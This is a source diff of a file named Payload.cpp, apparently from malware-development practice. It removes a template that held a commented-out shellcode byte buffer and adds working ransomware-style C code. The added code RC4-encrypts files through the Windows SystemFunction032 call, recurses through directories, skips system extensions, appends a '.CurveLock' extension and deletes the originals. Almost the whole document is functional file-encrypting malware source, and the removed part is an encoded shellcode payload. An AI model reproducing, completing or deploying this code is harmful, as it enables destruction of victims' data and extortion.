@@ -1,84 +1,279 @@
-// Payload.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
+#include <Windows.h>
+#include <stdio.h>
 
-#include <iostream>
+#define ENCRYPTED_FILE_EXTENSION	L".CurveLock"
+#define ENC_FILE_SIGNATURE			'RNSM'
 
-int main()
+#define MAX_FILE_SIZE_TO_ENC		0x6400000 // 104857600 - 100MB
+#define RC4_KEY_SIZE				32
+
+// ===================================================================================================================================================
+
+#define GET_FILE_EXTENSION_W(FilePath)		(wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)
+
+// ===================================================================================================================================================
+
+typedef struct _ENCRYPTED_FILE_HEADER {
+
+	BYTE	Signature[0x04];
+	BYTE	pRc4EncryptionKey[RC4_KEY_SIZE];
+
+}ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;
+
+typedef struct USTRING
 {
-    std::cout << "Hello World!\n";
-    /*
-    Test Payload
+	DWORD	Length;
+	DWORD	MaximumLength;
+	PVOID	Buffer;
 
-    Python - 
+} USTRING;
 
-buf =  b""
-buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
-buf += b"\x05\xef\xff\xff\xff\x48\xbb\x9f\xde\x64\x3e\x9e"
-buf += b"\x69\x23\x69\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
-buf += b"\xff\xe2\xf4\x63\x96\xe7\xda\x6e\x81\xe3\x69\x9f"
-buf += b"\xde\x25\x6f\xdf\x39\x71\x38\xc9\x96\x55\xec\xfb"
-buf += b"\x21\xa8\x3b\xff\x96\xef\x6c\x86\x21\xa8\x3b\xbf"
-buf += b"\x96\xef\x4c\xce\x21\x2c\xde\xd5\x94\x29\x0f\x57"
-buf += b"\x21\x12\xa9\x33\xe2\x05\x42\x9c\x45\x03\x28\x5e"
-buf += b"\x17\x69\x7f\x9f\xa8\xc1\x84\xcd\x9f\x35\x76\x15"
-buf += b"\x3b\x03\xe2\xdd\xe2\x2c\x3f\x4e\xe2\xa3\xe1\x9f"
-buf += b"\xde\x64\x76\x1b\xa9\x57\x0e\xd7\xdf\xb4\x6e\x15"
-buf += b"\x21\x3b\x2d\x14\x9e\x44\x77\x9f\xb9\xc0\x3f\xd7"
-buf += b"\x21\xad\x7f\x15\x5d\xab\x21\x9e\x08\x29\x0f\x57"
-buf += b"\x21\x12\xa9\x33\x9f\xa5\xf7\x93\x28\x22\xa8\xa7"
-buf += b"\x3e\x11\xcf\xd2\x6a\x6f\x4d\x97\x9b\x5d\xef\xeb"
-buf += b"\xb1\x7b\x2d\x14\x9e\x40\x77\x9f\xb9\x45\x28\x14"
-buf += b"\xd2\x2c\x7a\x15\x29\x3f\x20\x9e\x0e\x25\xb5\x9a"
-buf += b"\xe1\x6b\x68\x4f\x9f\x3c\x7f\xc6\x37\x7a\x33\xde"
-buf += b"\x86\x25\x67\xdf\x33\x6b\xea\x73\xfe\x25\x6c\x61"
-buf += b"\x89\x7b\x28\xc6\x84\x2c\xb5\x8c\x80\x74\x96\x60"
-buf += b"\x21\x39\x76\x24\x68\x23\x69\x9f\xde\x64\x3e\x9e"
-buf += b"\x21\xae\xe4\x9e\xdf\x64\x3e\xdf\xd3\x12\xe2\xf0"
-buf += b"\x59\x9b\xeb\x25\x99\x96\xcb\xc9\x9f\xde\x98\x0b"
-buf += b"\xd4\xbe\x96\x4a\x96\xe7\xfa\xb6\x55\x25\x15\x95"
-buf += b"\x5e\x9f\xde\xeb\x6c\x98\x2e\x8c\xac\x0b\x54\x9e"
-buf += b"\x30\x62\xe0\x45\x21\xb1\x5d\xff\x05\x40\x47\xfa"
-buf += b"\xa6\x01\x3e\x9e\x69\x23\x69"
+typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);
 
+// ===================================================================================================================================================
 
-    C - 
+BOOL Rc4EncryptionViaSystemFunc032(IN ULONG_PTR uFileBuffer, IN DWORD dwFileSize, IN OUT PENCRYPTED_FILE_HEADER pEncryptedFileHdr) {
 
-unsigned char buf[] =
-"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
-"\xff\xff\xff\x48\xbb\x18\x7e\x0b\xa5\x69\x90\x56\xf3\x48"
-"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe4\x36\x88"
-"\x41\x99\x78\x96\xf3\x18\x7e\x4a\xf4\x28\xc0\x04\xa2\x4e"
-"\x36\x3a\x77\x0c\xd8\xdd\xa1\x78\x36\x80\xf7\x71\xd8\xdd"
-"\xa1\x38\x36\x80\xd7\x39\xd8\x59\x44\x52\x34\x46\x94\xa0"
-"\xd8\x67\x33\xb4\x42\x6a\xd9\x6b\xbc\x76\xb2\xd9\xb7\x06"
-"\xe4\x68\x51\xb4\x1e\x4a\x3f\x5a\xed\xe2\xc2\x76\x78\x5a"
-"\x42\x43\xa4\xb9\x1b\xd6\x7b\x18\x7e\x0b\xed\xec\x50\x22"
-"\x94\x50\x7f\xdb\xf5\xe2\xd8\x4e\xb7\x93\x3e\x2b\xec\x68"
-"\x40\xb5\xa5\x50\x81\xc2\xe4\xe2\xa4\xde\xbb\x19\xa8\x46"
-"\x94\xa0\xd8\x67\x33\xb4\x3f\xca\x6c\x64\xd1\x57\x32\x20"
-"\x9e\x7e\x54\x25\x93\x1a\xd7\x10\x3b\x32\x74\x1c\x48\x0e"
-"\xb7\x93\x3e\x2f\xec\x68\x40\x30\xb2\x93\x72\x43\xe1\xe2"
-"\xd0\x4a\xba\x19\xae\x4a\x2e\x6d\x18\x1e\xf2\xc8\x3f\x53"
-"\xe4\x31\xce\x0f\xa9\x59\x26\x4a\xfc\x28\xca\x1e\x70\xf4"
-"\x5e\x4a\xf7\x96\x70\x0e\xb2\x41\x24\x43\x2e\x7b\x79\x01"
-"\x0c\xe7\x81\x56\xed\xd3\x91\x56\xf3\x18\x7e\x0b\xa5\x69"
-"\xd8\xdb\x7e\x19\x7f\x0b\xa5\x28\x2a\x67\x78\x77\xf9\xf4"
-"\x70\xd2\x60\xe3\x51\x4e\x3f\xb1\x03\xfc\x2d\xcb\x0c\xcd"
-"\x36\x88\x61\x41\xac\x50\x8f\x12\xfe\xf0\x45\x1c\x95\xed"
-"\xb4\x0b\x0c\x64\xcf\x69\xc9\x17\x7a\xc2\x81\xde\xc6\x08"
-"\xfc\x35\xdd\x7d\x06\x6e\xa5\x69\x90\x56\xf3";
+	NTSTATUS				STATUS = NULL;
+	HMODULE					hAdvapi32 = NULL;
+	fnSystemFunction032		SystemFunction032 = NULL;
+	unsigned short			us2RightMostBytes = NULL;
+	USTRING					UsBuffer = { 0 };
+	USTRING					UsKey = { 0 };
 
-    
-    */
+	us2RightMostBytes = (unsigned short)(((uFileBuffer & 0xFFFF) ^ (dwFileSize && 0xFF)) % 0xFFFF);
+
+	for (int i = 0; i < RC4_KEY_SIZE; i++) {
+		pEncryptedFileHdr->pRc4EncryptionKey[i] = (__TIME__[i % 6] * rand() + us2RightMostBytes) % 0xFF;
+		srand(__TIME__[rand() % 6] + us2RightMostBytes);
+	}
+
+	UsBuffer.Buffer = (PVOID)uFileBuffer; // Cast to PVOID
+	UsBuffer.Length = dwFileSize;
+	UsBuffer.MaximumLength = dwFileSize;
+
+	UsKey.Buffer = pEncryptedFileHdr->pRc4EncryptionKey;
+	UsKey.Length = RC4_KEY_SIZE;
+	UsKey.MaximumLength = RC4_KEY_SIZE;
+
+	if (!(hAdvapi32 = LoadLibraryW(L"Advapi32"))) {
+		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+
+	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032"))) {
+		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+
+	if ((STATUS = SystemFunction032(&UsBuffer, &UsKey)) != 0x0) {
+		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
 
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
+// ===================================================================================================================================================
+
+BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
+
+	HANDLE					hSourceFile = INVALID_HANDLE_VALUE,
+		hDestinationFile = INVALID_HANDLE_VALUE;
+	ULONG_PTR				uFileBufferAddr = NULL,
+		uEncryptedFileBufferAddr = NULL,
+		uTmpPntrVar = NULL;
+	DWORD					dwTmpSizeVar = 0x00,
+		dwFileBufferSize = 0x00,
+		dwNumberOfBytesRead = 0x00,
+		dwNumberOfBytesWritten = 0x00;
+	BOOL					bResult = FALSE;
+	PWCHAR					pwcDuplicateStr = NULL,
+		pwcOgFileExtension = NULL,
+		pwcEncryptedFilePath = NULL;
+	ENCRYPTED_FILE_HEADER	EncryptedFileHeader = { 0 };
+	const WCHAR* szBlackListedExtensions[11] = { ENCRYPTED_FILE_EXTENSION, L".exe", L".dll", L".sys", L".ini", L".conf", L".cfg", L".reg", L".dat", L".bat", L".cmd" };
+
+	if (!szFilePathToEncrypt)
+		return FALSE;
+
+	RtlSecureZeroMemory(&EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));
+
+	if (!(pwcDuplicateStr = _wcsdup(szFilePathToEncrypt)))
+		goto _END_OF_FUNC;
+
+	dwTmpSizeVar = (wcslen(pwcDuplicateStr) + wcslen(ENCRYPTED_FILE_EXTENSION) + 0x01) * sizeof(WCHAR);
+
+    if (!(pwcEncryptedFilePath = (PWCHAR)malloc(dwTmpSizeVar))) {
+        uTmpPntrVar = (ULONG_PTR)pwcEncryptedFilePath;
+        goto _END_OF_FUNC;
+    }
+	else
+		swprintf_s(pwcEncryptedFilePath, dwTmpSizeVar, L"%s%s", pwcDuplicateStr, ENCRYPTED_FILE_EXTENSION);
+
+	if (!(pwcOgFileExtension = GET_FILE_EXTENSION_W(szFilePathToEncrypt)))
+		goto _END_OF_FUNC;
+
+	for (int i = 0; i < 11; i++) {
+		if (wcscmp(pwcOgFileExtension, szBlackListedExtensions[i]) == 0x00) {
+			printf("[!] Blacklisted File Extension [%ws] \n", szBlackListedExtensions[i]);
+			goto _END_OF_FUNC;
+		}
+	}
+
+	*(ULONG*)&EncryptedFileHeader.Signature = ENC_FILE_SIGNATURE;
+
+	if ((hDestinationFile = CreateFileW(pwcEncryptedFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if ((hSourceFile = CreateFileW(szFilePathToEncrypt, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
+		printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if (dwFileBufferSize >= MAX_FILE_SIZE_TO_ENC) {
+		printf("[!] File Size Exceeds The Limit (100MB) \n");
+		goto _END_OF_FUNC;
+	}
+
+	if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
+		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if (!(uEncryptedFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(dwFileBufferSize + sizeof(ENCRYPTED_FILE_HEADER))))) {
+		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+    if (!ReadFile(hSourceFile, (LPVOID)uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
+		printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
+		printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
+		goto _END_OF_FUNC;
+	}
+
+	if (*(ULONG*)uFileBufferAddr == ENC_FILE_SIGNATURE) {
+		printf("[!] File Already Encrypted \n");
+		goto _END_OF_FUNC;
+	}
+
+    if (!Rc4EncryptionViaSystemFunc032((ULONG_PTR)uFileBufferAddr, dwFileBufferSize, &EncryptedFileHeader))
+		goto _END_OF_FUNC;
+
+	memcpy((PBYTE)uEncryptedFileBufferAddr, &EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));
+	memcpy((PBYTE)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), (PBYTE)uFileBufferAddr, dwFileBufferSize);
+
+	dwFileBufferSize = dwNumberOfBytesRead + sizeof(ENCRYPTED_FILE_HEADER);
+
+    if (!WriteFile(hDestinationFile, (LPCVOID)uEncryptedFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesWritten, NULL) || dwFileBufferSize != dwNumberOfBytesWritten) {
+		printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
+		printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, dwFileBufferSize);
+		goto _END_OF_FUNC;
+	}
+
+	if (!FlushFileBuffers(hDestinationFile)) {
+		printf("[!] FlushFileBuffers Failed With Error: %d\n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	if (!SetEndOfFile(hDestinationFile)) {
+		printf("[!] SetEndOfFile Failed With Error: %d\n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	bResult = TRUE;
+
+_END_OF_FUNC:
+	if (hSourceFile != INVALID_HANDLE_VALUE)
+		CloseHandle(hSourceFile);
+	if (hDestinationFile != INVALID_HANDLE_VALUE)
+		CloseHandle(hDestinationFile);
+	if (pwcDuplicateStr)
+		free(pwcDuplicateStr);
+    if (uTmpPntrVar)
+        free((void *)uTmpPntrVar);
+	if (uFileBufferAddr)
+		LocalFree((HLOCAL)uFileBufferAddr);
+	if (uEncryptedFileBufferAddr)
+		LocalFree((HLOCAL)uEncryptedFileBufferAddr);
+	return bResult;
+}
+
+// ===================================================================================================================================================
+
+BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {
+	if (!szDirectoryPath)
+		return FALSE;
+
+	WIN32_FIND_DATAW FindFileData = { 0x00 };
+	WCHAR szDirPath[MAX_PATH * 2] = { 0x00 };
+	WCHAR szFullStrPath[MAX_PATH * 2] = { 0x00 };
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	BOOL bResult = FALSE;
+
+	_snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);
+	wprintf(L"[*] Searching in directory: %s\n", szDirPath);
+
+	if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
+		printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
+		goto _END_OF_FUNC;
+	}
+
+	do {
+
+		if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
+			continue;
+
+		_snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);
+
+		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+
+			printf("[*] Directory: %ws\n", szFullStrPath);
+
+			if (!EncryptFilesInGivenDir(szFullStrPath))
+				goto _END_OF_FUNC;
+		}
+
+		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+			printf("\t> Encrypting File: %ws ... %s \n", szFullStrPath, ReplaceWithEncryptedFile(szFullStrPath) ? "[+] DONE" : "[-] Failed");
+
+	} while (FindNextFileW(hFind, &FindFileData));
+
+	bResult = TRUE;
+
+_END_OF_FUNC:
+	if (hFind != INVALID_HANDLE_VALUE)
+		FindClose(hFind);
+	return bResult;
+}
+
+int main() {
+	LPCWSTR directoryPath = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
+	wprintf(L"[*] Encrypting files in directory: %s\n", directoryPath);
+
+	if (!EncryptFilesInGivenDir(directoryPath)) {
+		printf("[!] Failed To Encrypt Files In The Given Directory \n");
+	}
+	else {
+		printf("[+] Files In The Given Directory Have Been Encrypted \n");
+	}
+	return 0;
+}
